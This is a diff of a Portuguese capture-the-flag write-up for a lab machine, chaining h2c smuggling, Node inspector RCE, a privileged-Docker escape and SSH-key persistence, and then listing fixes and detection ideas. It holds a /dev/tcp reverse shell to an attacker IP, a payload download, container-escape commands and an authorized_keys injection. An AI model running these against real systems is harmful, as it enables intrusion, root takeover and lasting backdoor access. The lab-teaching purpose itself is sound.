@@ -1,4 +1,4 @@
----
+﻿---
 title: Tunnel - Desafio Hacker [HackingClub]
 description: 'Resolvendo máquina nível médio da Hacking Club sobre h2c request smuggling, RCE e Docker escape'
 author: matheus
@@ -475,7 +475,6 @@ Consultando [Runtime.evaluate](https://chromedevtools.github.io/devtools-protoco
 - Pode ser desde expressões matemáticas simples (`2+4`) até scripts complexos
 - No contexto Node.js, permite acesso a módulos como `fs`, `child_process`, etc.
 
-
 ### 9.4 Testando execução de código
 
 **Payload de teste:**
@@ -621,6 +620,37 @@ nc -lvnp 8000
 
 **Payload via DevTools Protocol:**
 
+### Entendendo o que vamos fazer
+
+Antes de executar, vale explicar rapidamente os conceitos por trás da técnica:
+
+**Reverse Shell** é quando invertemos a lógica de conexão - ao invés do atacante se conectar na vítima, fazemos a vítima se conectar no atacante. Isso é muito útil porque a maioria dos firewalls bloqueia conexões de entrada, mas não de saída.
+
+**Payload** basicamente é o código malicioso que será executado na máquina alvo.
+
+**O processo funcionará assim, veja:**
+
+1. Deixamos o netcat escutando na nossa máquina (`nc -lvnp 8000`), no aguardo da "comunicação" com o alvo
+2. Executamos um comando na vítima que força ela a estabelecer uma conexão com a nossa máquina
+3. Quando conectado, temos então um shell completo
+
+**Nossa payload vai usar Node.js** para executar um comando bash que estabelece essa conexão reversa. O `child_process.execSync()` permite executar *comandos do sistema* através do JavaScript.
+
+**O comando bash em si:**
+
+Chamaremos a bash através do caminho completo `/bin/bash` com `-c` para execução de um comando específico.
+
+- `bash -i` abre um shell interativo
+- `>& /dev/tcp/IP/PORTA` redireciona a saída para uma conexão TCP
+- `0>&1` faz a entrada também usar essa mesma conexão
+- Resultado: tudo fica conectado entre as duas máquinas
+
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/10.0.30.175/8000 0>&1'
+```
+
+Agora basta executar um reverse shell para ter acesso direto à máquina:
+
 ```json
 {
   "id": 1,
@@ -630,13 +660,6 @@ nc -lvnp 8000
   }
 }
 ```
-
-**Explicação da payload bash:**
-
-- `bash -i` = Shell interativo
-- `>&` = Redireciona stdout e stderr
-- `/dev/tcp/IP/PORT` = Pseudo-device do bash para TCP  
-- `0>&1` = Redireciona stdin também
 
 ✅ **Resultado: Shell reversa obtida como root no container**
 
@@ -657,7 +680,9 @@ ls -la
 
 **Conclusão:** Estamos como root dentro de um container Docker, não na máquina principal. Necessário Docker Escape para a flag final.
 
-### 12.2 Melhorando interação da shell (NÃO É NECESSÁRIO)
+### 12.2 Melhorando interação da shell
+
+A shell reversa inicial é bem limitada - não conseguimos usar setas, clear, ou colar comandos direito. Vamos melhorar isso:
 
 ```bash
 cd /root
@@ -665,13 +690,26 @@ ls -la
 which script  # ✅ Disponível
 ```
 
-**Upgrade de TTY:**
+**Sequência de upgrade que funciona:**
 
 ```bash
+# Primeiro upgrade básico
 script /dev/null -c bash
-export TERM=xterm  
-stty raw -echo && fg
+
+# Configurar terminal
+export TERM=xterm
+export SHELL=bash
+
+# Background da conexão e fix do terminal
+# Ctrl+Z para background
+stty raw -echo; fg
+
+# Agora pressione Enter duas vezes
+# Reset final (opcional)
+reset
 ```
+
+**Nota:** O comando `fg` pode dar problema nessa máquina especificamente. Se travar, apenas pressione Enter algumas vezes que geralmente volta. Mesmo sem o `fg` funcionar perfeitamente, já conseguimos usar `clear` e colar comandos.
 
 ### 12.3 Análise da topologia de rede
 
@@ -684,16 +722,17 @@ hostname -I  # IP interno do container
 **INTERPRETAÇÃO da rede Docker:**
 
 - Range `172.18.0.0/16` = Rede bridge customizada
-- `172.18.0.1` = Gateway (provavelmente o host)  
-- `172.18.0.2` = Nossa máquina principal
+- `172.18.0.1` = Gateway do Docker
 - `172.18.0.3` = Nosso container atual
-- Possíveis outros containers na mesma rede
+- **Host principal:** `172.16.3.113` (mesmo IP que acessamos o site)
+- Possíveis outros containers na rede `172.18.0.x`
 
-**Opções de lateral movement:**
+**Opções realistas de movimento:**
 
-- **Network scanning** - `nmap 172.18.0.0/24`
-- **Service discovery** - Procurar outros serviços internos
-- **Docker escape** - Foco principal para acessar o host
+- **Docker escape** - Foco principal, se conseguirmos vai direto para o host
+- **Verificar devices montados** - `ls /dev/` para ver se temos acesso privilegiado
+- **Enumerar capabilities** - Testar se conseguimos fazer mount, acessar processos do host
+- **Network scan** limitado - Container pode não ter ferramentas de rede adequadas
 
 ### 12.4 Automatizando Docker security assessment
 
@@ -718,7 +757,7 @@ python3 -m http.server 8000 #abrir server para transferir o arquivo para o conta
 ```bash
 wget 10.0.30.175:8000/deepce.sh #colocar seu IP externo de maquina
 chmod +x deepce.sh #permissão ao script
-./deepce.sh #executar script - vai acabar n sendo necessário utilizar ele nesse caso
+./deepce.sh #executar script - vai acabar n sendo realmente necessário utilizar ele para resolvermos esse caso
 ```
 
 ### 12.5 Docker Capabilities e Containers Privilegiados
@@ -745,11 +784,12 @@ Sem a ferramenta `capsh`, testamos capabilities indiretamente:
 **Análise de partições:**
 
 ```bash
-df -h
-# fdisk -l não disponível no container
+disk -l # se disponível (não terá no container)
+df -h # estará disponível e mostrará para você as partições que poderão talvez ser montados
+lsblk # se disponível
 ```
 
-A partição de maior tamanho será nosso alvo para mount.
+A partição de maior tamanho (nvme) será nosso alvo para mount.
 
 ## 13. Docker Escape — Explorando Container Privilegiado
 
@@ -760,7 +800,6 @@ Em containers privilegiados, podemos montar partições do sistema host:
 ```bash
 # Listar partições disponíveis
 df -h
-lsblk  # se disponível
 
 # Tentar montar a partição principal do host  
 mount /dev/nvme0n1p1 /mnt
@@ -778,16 +817,54 @@ mount /dev/nvme0n1p1 /mnt
 ✅ `/mnt` agora contém o **filesystem completo do host**  
 ✅ `/mnt/root` = diretório `/root` do sistema hospedeiro
 
-### 13.2 Alternativas de escape (se mount falhasse)
+**PRONTO!!** Agora é só dar "`cat root.txt`" e ver a última flag que precisamos, mas ainda não estamos satisfeito. Faremos isso de outra forma, vamos estipular desafios. Só poderemos visualizar tal arquivo se estivermos conectados como root da máquina host principal e não apenas acessando a partição dessa máquina montada. Para isso, nós iremos nos conectar diretamente via conexão SSH.
 
-- **Shared PID namespace** → `nsenter` para processos do host
-- **Socket do Docker** → `docker -H unix://var/run/docker.sock run`  
-- **Device access** → Escrita direta em `/dev/sda`
-- **Kernel modules** → Carregamento de LKM malicioso
+### 13.2 Outras técnicas de escape (se mount falhasse)
+
+Se por acaso o mount não funcionasse, existem outras maneiras de escapar de containers privilegiados:
+
+**nsenter com PID namespace compartilhado:**
+Se o container tiver acesso aos processos do host (`--pid=host`), podemos usar `nsenter` para "entrar" no namespace do processo init do host:
+```bash
+nsenter -t 1 -m -p /bin/bash
+```
+
+**Socket do Docker exposto:**
+Alguns containers têm acesso ao socket do Docker montado. Isso permite criar novos containers com acesso total ao host:
+```bash
+docker -H unix://var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i bash
+```
+
+**Escrita em devices de bloco:**
+Com acesso aos device nodes (`/dev/sda`, `/dev/nvme0n1`), podemos escrever diretamente no disco:
+```bash
+# Muito perigoso - pode corromper o sistema
+echo 'dados' > /dev/sda1  
+```
+
+**Carregamento de módulos do kernel:**
+Com `CAP_SYS_MODULE`, podemos carregar módulos maliciosos no kernel do host.
+
+Mas o mount é geralmente a técnica mais direta e confiável quando o container é privilegiado.
 
 ### 13.3 Acesso ao host via SSH (método alternativo)
 
+Já conseguimos ver o conteúdo do host através do mount, mas vamos fazer algo mais elegante. Ao invés de só olhar os arquivos pela partição montada, que tal conseguir um shell SSH direto na máquina host? 
+
+A ideia é simples: como temos acesso de escrita ao diretório `/root/.ssh/` do host (através do `/mnt/root/.ssh/`), podemos adicionar nossa chave pública SSH no arquivo `authorized_keys`. Depois disso, conseguimos conectar via SSH como se fôssemos um usuário legítimo.
+
+**Entendendo SSH e autenticação por chaves:**
+
+SSH (Secure Shell) é um protocolo de comunicação segura que permite conexão remota entre computadores. Existem duas formas principais de autenticação:
+
+- **Password:** Usuário e senha (menos seguro)
+- **Chave pública/privada:** Par de chaves criptográficas (mais seguro)
+
+A autenticação por chaves funciona assim: você gera um par de chaves - uma privada (que fica secreta com você) e uma pública (que pode ser compartilhada). A chave pública é adicionada no arquivo `~/.ssh/authorized_keys` do servidor, e quando você se conecta com sua chave privada, o SSH confirma que você possui a chave correspondente.
+
 #### Dentro da máquina pessoal:
+
+Primeiro, vamos gerar um par de chaves SSH na nossa máquina:
 
 **Gerando chave SSH:**
 
@@ -797,36 +874,88 @@ ssh-keygen -t rsa -f rsa
 cat rsa.pub | base64 -w0 | xclip -sel clip
 ```
 
+**Explicando os comandos:**
+
+- `ssh-keygen -t rsa -f rsa`: Gera um par de chaves RSA. O `-t rsa` especifica o tipo de criptografia, e `-f rsa` define o nome dos arquivos (rsa e rsa.pub)
+- `cat rsa.pub`: Mostra o conteúdo da chave pública (arquivo .pub)
+- `base64 -w0`: Codifica em base64 sem quebras de linha (-w0). Isso facilita a transferência, pois evita problemas com caracteres especiais
+- `xclip -sel clip`: Copia o resultado para a área de transferência do sistema (clipboard). Assim podemos colar facilmente
+
+O resultado será algo como uma string longa em base64 que contém nossa chave pública codificada.
+
 #### Dentro da máquina alvo:
 
-**Copiando chave base64 para authorized_keys do host:**
+Agora, do container comprometido, vamos adicionar nossa chave pública ao arquivo `authorized_keys` do root no host. Como temos o filesystem montado em `/mnt`, podemos escrever diretamente:
+
+**Copiando chave para authorized_keys do host:**
 
 ```bash
-#cd .ssh #dentro do /mnt/root -> echo '<base64_da_chave_publica_shift_ctrl_c>' | base64 -d > authorized_keys
-echo 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FENURmbGVNTStESmNiTUxUSFZRd3lQT2lrYmI0QjV4eUFNb1JPZmdUKzIwWWtJSmxpcE91M25jTTB1N2tJb2ZZTE1NUTY2ZzIycFVkZHNxWXNXclZyUnNGSjZEVEFVT0lubVlESHdjMlVZM0ZzWWdFUjBsV0RaTlJ5b2lTS3hNS2hLTW42VWxWc21GVGx2MDBDNGFrQml1MnlvQytVb2hWaDlYTDdsNFd2eE5EWk05TDF3b0wxdWtRZGUyMDUxd2lWakVKc1kvNXFoUGJzUUM1V2o5YmttNmdYcS96YVExdEQzVW9HbVZtMjhnN1dNMk1BNFVaWGVxOGw4Qnh2YVV5bFZDdU9nZW9NNW5lUlFFUUxiOERGWVdDZmVBYWF0SFBPaDdmTGZnQThkRUxHbS82VUFKSGtjSmJrdzdkMUdHeFRlQlZ1UENvM3FGVzFNbDVvVW1UZUVUNUduaVkwUzJQazlSYjZmblEyQnBUQXpOYmg0R2JFNVN2Ykt4Wjl5ZFFNdnlETUpicDNjYldLekhVdFFLQ0RTNEFJZGI0TW95ZUpzeUE3T1UwL2xkV2M3OCt2UFVoK1daZlIyRnFSSUtMbmdHRUtocDFueHRQRVVmeFpzY3BLSlNGRWEyTE5ZZENCbGtxcHowZDh5ejFvazBEeTdMOFhlUmtHbXhXOHlMQ2M9IG1hdGhldXNAbGFpZGxlcgo=' | base64 -d >> /mnt/root/.ssh/authorized_keys
+#echo '<base64_da_chave_publica_shift_ctrl_c>' | base64 -d >> /mnt/root/.ssh/authorized_keys
+echo 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FENURmbGVNTStESmNiTUxUSFZRd3lQT2lrYmI0QjV4eUFNb1JPZmdUKzIwWWtJSmxpcE91M25jTTB1N2tJb2ZZTE1NUTY2ZzIycFVkZHNxWXNXclZyUnNGSjZEVEFVT0lubVlESHdjMlVZM0ZzWWdFUjBsV0RaTlJ5b2lTS3hNS2hLTW42VWxWc21GVGx2MDBDNGFrQml1MnlvQytVb2hWaDlYTDdsNFd2eE5EWk05TDF3b0wxdWtRZGUyMDUxd2lWakVKc1kvNXFoUGJzUUM1V2o5YmttNmdYcS96YVExdEQzVW9HbVZtMjhnN1dNMk1BNFVaWGVxOGw4Qnh2YVV5bFZDdU9nZW9NNW5lUlFFUUxiOERGWVdDZmVBYWF0SFBPaDdmTGZnQThkRUxHbS82VUFKSGtjSmJrdzdkMUdHeFRlQlZ1UENvM3FGVzFNbDVvVW1UZUVUNUduaVkwUzJQazlSYjZmblEyQnBUQXpOYmg0R2JFNVN2Ykt4Wjl5ZFFNdnlETUpicDNjYldLekhVdFFLQ0RTNEFJZGI0TW95ZUpzeUE3T1UwL2xkV2M3OCt2UFVoK1daZlIyRnFSSUtMbmdHRUtocDFueHRQRVVmeFpzY3BLSlNGRWEyTE5ZZENCbGtxcHowZDh5ejFvazBEeTdMOFhlUmtHbXhXOHlMQ2M9IG1hdGhldXNAbGFpZGxlcgo=' | base64 -d > authorized_keys
 ```
+
+**Explicando o processo de injeção:**
+
+- `echo 'string_base64'`: Enviamos a string em base64 que copiamos anteriormente
+- `base64 -d`: Decodifica a string base64 de volta para o formato original da chave SSH
+- `> authorized_keys`: Redireciona a saída para o arquivo authorized_keys (sobrescrevendo o conteúdo)
+- O comando comentado mostra o caminho completo: `/mnt/root/.ssh/authorized_keys`, pode ser util caso faça fora da pasta .ssh
+
+**Por que usar base64?**
+
+Usar base64 tem vantagens práticas importantes:
+
+- **Evita problemas de encoding:** Chaves SSH contêm caracteres especiais que podem ser interpretados incorretamente pelo terminal
+- **Facilita copiar/colar:** Uma string base64 é uma linha contínua, sem quebras que podem causar erros
+- **Transferência segura:** Não há risco de caracteres serem modificados durante a cópia entre máquinas
+- **Compatibilidade universal:** Base64 funciona em qualquer terminal, independente da configuração
+
+**Diferença entre `>` e `>>`:**
+
+- `> authorized_keys`: **Sobrescreve** o arquivo, ou seja, apaga o conteúdo anterior (não teve caminho por já estar no diretório).
+- `>> /mnt/root/.ssh/authorized_keys`: **Adiciona** ao final do arquivo, ou seja, preserva chaves existentes (exemplo fora da pasta).
+
+No comando comentado usamos `>>` porque é mais seguro - preserva outras chaves SSH que possam existir no sistema. Isso evita quebrar o acesso de administradores legítimos que já tinham chaves configuradas. No nosso caso específico, como estávamos criando o arquivo do zero (primeira vez), tanto `>` quanto `>>` dariam o mesmo resultado.
+
+**Como a persistência funciona:**
+
+Uma vez que nossa chave pública está no arquivo `authorized_keys` do root, o sistema SSH reconhece nossa chave privada como autorizada. Isso significa que podemos nos conectar como root sem precisar de senha, e a conexão permanece válida até que alguém remova nossa chave do arquivo.
+
+Essa técnica é muito usada por atacantes para manter acesso persistente a sistemas comprometidos, pois:
+
+- É discreta (não aparece em logs de login como tentativas de senha)
+- Funciona mesmo se senhas forem alteradas
+- Permite acesso direto sem precisar repetir toda a exploração
 
 **Acesso SSH direto ao host:**
 
 ```bash
-matheus@laidler ~/tunnel$ sudo ssh -i rsa root@172.16.3.113
+matheus@laidler~/tunnel$ sudo ssh -i rsa root@172.16.3.113
 #> yes
 #...
-root@ip-172-16-3-113# ls -la
+root@ip-172-16-3-113~#
 #pronto, entramos na máquina host como root direto.
 ```
 
 ✅ **Root no host**  
 ✅ **Comprometimento total**
 
-## 14. Acesso à flag final
+## 14. Capturando a flag final
 
-Com acesso completo ao filesystem do host via mount:
+Agora que temos acesso completo ao sistema, chegou a hora de pegar a segunda flag. Podemos fazer isso de duas formas: através da partição montada no container ou diretamente via SSH.
+
+**Via partição montada (dentro do container):**
 
 ```bash
-#cd /mnt/root 
+cd /mnt/root 
 ls -la
 cat root.txt
+```
+
+**Via host principal (SSH como root):**
+```bash
+root@ip-172-16-3-113~# ls -la
+root@ip-172-16-3-113~# cat root.txt
 ```
 
 **🚩 SEGUNDA FLAG ENCONTRADA:**
@@ -835,9 +964,11 @@ cat root.txt
 hackingclub{d349c11e22a06b34d04e58***************6a0d302}
 ```
 
-## 15. Análise do ambiente pós-exploração
+## 15. Investigando como tudo funcionou
 
-Ao estar logado na máquina host, seja ao acessar a partição montada no container (`/mnt/root`) ou acessando diretamente via SSH, ao listar o diretório veremos a pasta `stack`.
+Agora que temos controle total do sistema, vale a pena dar uma olhada "por trás das cortinas" para entender exatamente como as configurações permitiram nossa exploração. Isso vai nos ajudar a entender melhor as falhas de segurança e como corrigi-las.
+
+Quando listamos o diretório root, vemos uma pasta `stack` - provavelmente onde estão os arquivos de configuração da aplicação:
 
 ```bash 
 ls -la
@@ -845,14 +976,16 @@ cd stack
 ls
 ```
 
-### 15.1 Verificando configurações Nginx
+### 15.1 Examinando o docker-compose.yml
 
-Dentro da pasta STACK teremos:
- `Dockerfile.proxy`  `Dockerfile.spring`  `app`  `conf`  `docker-compose.yaml`  `spring`
+Dentro da pasta stack vemos vários arquivos interessantes. O mais importante é o `docker-compose.yml`, que nos mostra exatamente como toda a aplicação foi estruturada:
 
-Ao darmos um `cat Dockerfile.proxy` veremos que `conf/nginx.conf` é copiado para dentro do `/etc/nginx/conf.d/default.conf` do container.
+```bash
+ls
+# Dockerfile.proxy  Dockerfile.spring  app  conf  docker-compose.yaml  spring
+```
 
-Podemos continuar a explorar diversos destes itens, veremos também o docker-compose.yaml assim como veremos o arquivo de configuração do nginx e verificar se era ele mesmo que estava bloqueando o acesso ao endpoint: :
+Vamos olhar o arquivo principal de orquestração para entender a arquitetura:
 
 ```bash
 cat docker-compose.yaml 
@@ -930,26 +1063,52 @@ server {
 
 ```
 
- -  - Dockerfile.spring -> springboot -> internal -> NODE_DEBUG_PATH -> http://backend:8080 -> ...
+**Analisando o que descobrimos:**
 
-Perceba que:
- - O host backend é o springboot 
- - Todo request que vai paro a raiz "/" então vai para o springboot
- - Possui o header ´Upgrade`, isto é, aceita upgrade de HTTP1.1 para HTTP2
- - Nginx bloqueando com o `Deny all` se o endpoint `/actuator` for acessado
- - A config de acesso ao `admin/internal/web-socket-endpoint/` é internal:8000, que é a aplicacao do node *(container que caimos e pegamos shell)*
- - Falta verificar ainda o arquivo de configuração do Sping, que vai ser necessário saber como a má configuração possibilita o Request Smuggling
+Agora fica tudo claro! O docker-compose revela exatamente como conseguimos explorar o sistema:
 
-### 15.2 Verificando configuração Spring Boot
+1. **Backend (Spring Boot):** Tem a primeira flag nas variáveis de ambiente e configurações que apontam para o node debug
+2. **Proxy (Nginx):** Faz o roteamento mas permitiu o h2c smuggling
+3. **Internal (Node.js):** O ponto crítico - rodando como root, privileged, e com `--inspect` habilitado
+
+A linha mais perigosa é definitivamente `privileged: true` no container internal. Isso foi o que permitiu nosso Docker escape.
+
+### 15.2 Conferindo a configuração do Nginx
+
+Agora vamos verificar exatamente como o Nginx estava configurado para entender melhor o bypass:
 
 ```bash
- cd spring/spring/
- ls
- cd src/main/resources/
- cat application.yaml
+cd conf
+cat nginx.conf
 ```
 
-**Configuração crítica confirmada:**
+**Aqui vemos a configuração que permitiu nossa exploração:**
+
+```nginx
+location / {
+    proxy_pass http://backend:8080;
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;      # ← Problema aqui!
+    proxy_set_header Connection $http_connection; # ← E aqui também!
+}
+
+location /actuator {
+    deny all;  # ← Bloqueado pelo Nginx, mas bypassamos via h2c
+}
+```
+
+**O problema estava nas linhas do Upgrade:** O Nginx estava repassando os headers `Upgrade` e `Connection` sem validar adequadamente. Isso permitiu que nosso upgrade para h2c passasse direto para o backend Spring Boot.
+
+### 15.3 Confirmando o suporte a HTTP/2 no Spring
+
+Para o h2c smuggling funcionar, o backend precisa suportar HTTP/2. Vamos confirmar:
+
+```bash
+cd spring/spring/src/main/resources/
+cat application.yaml
+```
+
+**Bingo! Encontramos a peça que faltava:**
 
 ```yaml
 server:
@@ -957,334 +1116,120 @@ server:
     enabled: true
 ```
 
-**Análise:** Requisito obrigatório para h2c smuggling (HTTP/2 deve estar habilitado no backend).
+**Agora tudo faz sentido!**
 
-### 15.3 Configurações confirmadas:
+A cadeia de exploração funcionou porque:
 
-- Bloqueio explícito de `/actuator`  
-- Permissão para header `Upgrade: h2c`
-- Proxy para diferentes backends:
-  - backend (Spring Boot)
-  - internal (Node debugging endpoint)
-- Spring Boot configurado com server `http2` enable
+1. **Nginx mal configurado:** Repassava headers `Upgrade` sem validação
+2. **Spring Boot com HTTP/2:** Backend aceitava upgrade para h2c
+3. **Container privilegiado:** Node.js rodando com privilégios de escape
+4. **Debug habilitado:** `--inspect` exposto permitindo RCE
 
-## 16. Análise técnica e mitigações
+Cada falha individual já seria problemática, mas todas juntas criaram um caminho direto do browser até root no host. É um ótimo exemplo de como problemas de configuração podem se acumular criando vulnerabilidades críticas.
 
-### 16.1 Chain de exploração
+## 16. Lições aprendidas e como se proteger
 
-1. **Enumeração** → Identificação de Spring Boot + Nginx proxy reverso
-2. **h2c Smuggling** → Bypass de ACL através de HTTP/2 Cleartext upgrade  
-3. **Actuator exposure** → Descoberta de informações sensíveis e endpoints internos
-4. **Chrome DevTools Protocol** → Exploração de WebSocket de debugging Node.js
-5. **RCE via CDP** → Execução de JavaScript com child_process  
-6. **Container privilegiado** → Docker escape via mount de filesystem
-7. **Host compromise** → Acesso root completo ao sistema hospedeiro via SSH
+### 16.1 Como conseguimos quebrar tudo
 
-### 16.2 Mitigações rápidas
+Nossa exploração funcionou porque encontramos uma "tempestade perfeita" de configurações problemáticas:
 
-#### 16.2.1 HTTP/2 Cleartext (h2c)
+1. **Enumeração** → Spring Boot exposto com endpoints padrão
+2. **h2c Smuggling** → Nginx repassando headers `Upgrade` sem validação
+3. **Information Disclosure** → Actuator com variáveis de ambiente sensíveis
+4. **RCE via CDP** → Node.js debug exposto publicamente
+5. **Container Escape** → Container privilegiado permitindo mount do host
+6. **Persistence** → SSH keys injection para manter acesso
 
-- Desabilitar suporte a h2c em produção
-- Configurar Nginx para rejeitar headers de upgrade H2C  
-- Implementar validação rigorosa de protocolos no proxy
+O problema não foi uma vulnerabilidade específica, mas sim várias configurações inseguras que se somaram.
 
-**Exemplo de configuração Nginx:**
+### 16.2 Correções essenciais
+
+Baseado nos arquivos que encontramos na seção 15, aqui estão as correções que teriam impedido nosso ataque:
+
+#### 1. Nginx - O grande vilão do h2c bypass
+
+O problema principal estava na configuração do Nginx que repassava cegamente os headers `Upgrade` e `Connection`. Vimos isso no arquivo nginx.conf original:
 
 ```nginx
-# ────────────────────────────────────────────────
-#   DEFESAS BÁSICAS CONTRA H2C / REQUEST SMUGGLING
-# ────────────────────────────────────────────────
+proxy_set_header Upgrade $http_upgrade;      # ← Perigoso!
+proxy_set_header Connection $http_connection; # ← Permitiu h2c!
+```
 
-# Bloqueia tentativas de upgrade para HTTP/2 em texto puro (H2C)
-# Isso evita ataques como "H2C smuggling" via reverse proxy.
+A correção seria simples: bloquear explicitamente tentativas de upgrade para h2c e limpar esses headers por padrão. Algo assim resolveria:
+
+```nginx
+# Rejeitar qualquer tentativa de h2c smuggling
 if ($http_upgrade ~* "h2c") {
     return 400;
 }
-
-# Remove headers perigosos para impedir upgrades indevidos
-# (previne WebSocket/H2C sendo ativados quando não deveria)
+# Não repassar headers perigosos por padrão
 proxy_set_header Upgrade "";
 proxy_set_header Connection "";
-
-
-# ────────────────────────────────────────────────
-#   CONFIGURAÇÃO PRINCIPAL DO SERVIDOR
-# ────────────────────────────────────────────────
-server {
-    listen 80 default_server;
-    server_name localhost;
-
-    # ────────────────────────────────────────────
-    #   / → backend Java
-    # ────────────────────────────────────────────
-    location / {
-        proxy_pass http://backend:8080;
-        proxy_http_version 1.1;
-
-        # Permite upgrade somente quando realmente necessário
-        # (evita fallback para valores vazios do bloco global)
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection $http_connection;
-    }
-
-    # ────────────────────────────────────────────
-    #   /actuator → proibido externamente
-    # ────────────────────────────────────────────
-    location /actuator {
-        deny all;
-    }
-
-    # ────────────────────────────────────────────
-    #   WebSocket interno do serviço "internal"
-    # ────────────────────────────────────────────
-    location /admin/internal-web-socket-endpoint/ {
-        proxy_pass http://internal:8000/;
-        proxy_http_version 1.1;
-
-        # Upgrades só para WebSocket legítimo
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection $http_connection;
-
-        # Headers necessários para WebSockets atrás de proxy
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    }
-}
-
 ```
 
-#### 16.2.2 Spring Boot Actuator
+#### 2. Spring Boot Actuator - Endpoints críticos expostos
+
+O Actuator estava expondo informações sensíveis (como a primeira flag nas variáveis de ambiente). O ideal seria:
+
+- **Isolar completamente:** Colocar em porta administrativa separada que não passa pelo proxy
+- **Restringir acesso:** Bind apenas em localhost ao invés de aceitar conexões externas `management.server.address=127.0.0.1`
+- **Expor apenas o essencial:** Só endpoints como `/health` que não vazam dados sensíveis `management.endpoints.web.exposure.include=health`
+
+Assim o h2c bypass não teria conseguido acessar nada crítico.
+
+#### 3. Node.js Debug - RCE direto
+
+Descobrimos no docker-compose que o Node estava rodando com `--inspect=0.0.0.0:8000`, expondo o debugging para qualquer IP. Isso é suicide em produção.
+
+- Se necessário, bind em localhost: `--inspect=127.0.0.1:9229`
+
+A correção óbvia  `NODE_ENV=development`: debug só em desenvolvimento e sempre em localhost. Se precisar debuggar remotamente em produção (não recomendado), usar túnel SSH ao invés de expor diretamente.
+
+#### 4. Docker - A falha que quebrou tudo
+
+A linha `privileged: true` no container foi o que permitiu nosso escape total. Container privilegiado é basicamente dar as chaves do reino.
+
+As correções básicas que teriam impedido o escape:
+
+- Remover `privileged: true`
+- Rodar como usuário não-root (`user: "1000:1000"`)
+- Filesystem read-only para impedir modificações
+- Drop de capabilities desnecessárias
+
+Cada uma dessas falhas sozinha já seria ruim, mas juntas criaram um caminho direto do browser até root no host.
 
 ```yaml
-# application-prod.yml - Configuração segura para produção
-management:
-  endpoints:
-    web:
-      exposure:
-        include: "health,info"    # Apenas endpoints não-sensíveis
-      base-path: "/management"   # Caminho não-óbvio
-    jmx:
-      exposure:
-        exclude: "*"             # Desabilita JMX completamente
-  endpoint:
-    health:
-      show-details: never       # Nunca expor detalhes internos
-    info:
-      enabled: true
-  security:
-    enabled: true             # Autenticação obrigatória
-  server:
-    port: 8081                # Porta administrativa SEPARADA
-    address: 127.0.0.1        # Apenas loopback
+# NUNCA em produção usar true:
+privileged: false  # Pode até remover completamente esta linha, sério...
+
+# Usar hardening básico:
+security_opt:
+  - no-new-privileges:true
+cap_drop:
+  - ALL
+user: "1000:1000"  # usuário não-root
+read_only: true    # filesystem imutável
 ```
 
-#### 16.2.3 Node.js DevTools
+### 16.3 Detecção e monitoramento
 
-```javascript
-// Configuração segura para debugging
-const enableDebug = () => {
-  const isDev = process.env.NODE_ENV === 'development';
-  const debugFlag = process.env.DEBUG_MODE === 'true';
-  const isLocal = process.env.HOSTNAME === 'localhost';
-  
-  // Múltiplas verificações de segurança
-  if (isDev && debugFlag && isLocal) {
-    require('inspector').open(9229, '127.0.0.1', false);
-    console.warn('[DEBUG] Inspector habilitado em modo desenvolvimento');
-  }
-};
+Para detectar tentativas similares:
 
-// Nunca expor em produção
-if (process.env.NODE_ENV !== 'production') {
-  enableDebug();
-}
-```
+- **Logs do Nginx:** Monitorar headers `Upgrade: h2c`
+- **Spring Boot:** Alertas em acessos a `/actuator/*`
+- **Docker:** Logs de operações de mount em containers
+- **Node.js:** Detecção de `inspector.open()` em produção
 
-#### 16.2.4 Docker Security
+### 16.4 O que aprendemos
 
-```yaml
-# docker-compose.yml
-version: "3.8"
+Esta máquina mostra perfeitamente como **defense in depth** é crucial. Cada falha individual poderia ter sido mitigada:
 
-services:
-  backend:
-    restart: always
-    build:
-      context: .
-      dockerfile: Dockerfile.spring
+- Se o Nginx bloqueasse h2c → sem bypass do Actuator
+- Se o Actuator estivesse em localhost → sem descoberta de endpoints
+- Se o debug Node.js estivesse desabilitado → sem RCE
+- Se o container não fosse privilegiado → sem escape
 
-    environment:
-      - SPRING_PROFILES_ACTIVE=prod
-      - FLAG="hackingclub{c71b3ebb3e25f3c8304d9010a1c3765742309a3f}"
-      - NODE_DEBUG_HOST="http://internal:8000/"
-      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"
-
-    # ──────────────────────────────
-    #  HARDENING / SEGURANÇA
-    # ──────────────────────────────
-
-    security_opt:
-      - no-new-privileges:true    # Impede que qualquer processo ganhe privilégios extra (mesmo via exploit)
-
-    cap_drop:
-      - ALL                        # Remove TODAS capabilities Linux (mitiga contêiner pivot e syscalls perigosas)
-
-    # cap_add: []                  # Não adicionamos nada — backend não deveria precisar de capabilities
-
-    read_only: true                # Filesystem somente leitura → impede webshell escrita, modificação de binários etc.
-    user: "1000:1000"              # Roda como usuário NÃO-ROOT → reduz impacto de RCE
-
-    networks:
-      - app-network                # Isolamento de rede entre serviços (evita exposição desnecessária)
-
-  proxy:
-    restart: always 
-    build:
-      context: .
-      dockerfile: Dockerfile.proxy
-
-    ports:
-      - "8000:80"
-
-    depends_on:
-      - backend
-      - internal
-
-    # ──────────────────────────────
-    #  HARDENING / SEGURANÇA (PROXY)
-    # ──────────────────────────────
-
-    security_opt:
-      - no-new-privileges:true
-
-    cap_drop:
-      - ALL
-
-    cap_add:
-      - NET_BIND_SERVICE           # ÚNICA capability necessária para rodar na porta 80 sem ser root
-
-    read_only: true
-    user: "1000:1000"
-
-    networks:
-      - app-network
-
-  internal:
-    restart: always
-    image: node
-
-    # privileged: true  (FORMATO ORIGINAL) X
-    # ► PERIGO EXTREMO: dá root TOTAL no host, permite escape completo via RCE.
-    privileged: false     # Agoras está seguro.
-
-    # ──────────────────────────────
-    #    HARDENING / SEGURANÇA
-    # ──────────────────────────────
-
-    security_opt:
-      - no-new-privileges:true
-
-    cap_drop:
-      - ALL                 # Remove todas capabilities
-    # cap_add pode ser adicionado se o Node precisar de algo (normalmente não precisa)
-
-    read_only: true         # Torna o filesystem imutável → ataques RCE não conseguem alterar server.js
-
